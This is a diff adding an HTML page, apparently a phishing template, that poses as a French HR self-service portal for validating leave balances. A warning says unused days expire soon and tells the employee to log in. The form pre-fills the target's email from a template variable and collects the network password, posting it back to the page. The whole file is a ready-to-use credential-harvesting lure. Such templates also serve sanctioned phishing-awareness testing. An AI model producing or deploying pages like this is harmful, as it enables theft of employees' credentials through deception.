@@ -1,0 +1,28 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/>
+	<title>Portail RH - Gestion des Absences</title>
+	<style type="text/css">body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 400px; border-top: 5px solid #2980b9; }
+        .logo { color: #2980b9; font-size: 22px; font-weight: bold; margin-bottom: 20px; text-align: center; }
+        h2 { font-size: 18px; color: #333; margin-bottom: 20px; text-align: center; }
+        .alert { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: 10px; font-size: 13px; border-radius: 4px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background-color: #2980b9; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #2471a3; }
+        .footer { font-size: 11px; color: #999; text-align: center; margin-top: 20px; }
+	</style>
+</head>
+<body>
+<div class="login-card">
+<div class="logo">Self-Service RH</div>
+
+<h2>Validation des compteurs de congés</h2>
+
+<div class="alert"><strong>Attention :</strong> Vous avez des jours non soldés qui expirent prochainement. Veuillez vous identifier pour soumettre votre demande de report.</div>
+
+<form action="" method="POST"><input readonly="readonly" type="text" value="{{.Email}}"/> <input placeholder="Mot de passe réseau" required="" type="password" name="password"/><button type="submit">ACCÉDER À MES COMPTEURS</button></form>
+
+<div class="footer">© 2026 Direction des Ressources Humaines - Service Paie</div>
+</div>
+
+
+</body></html>
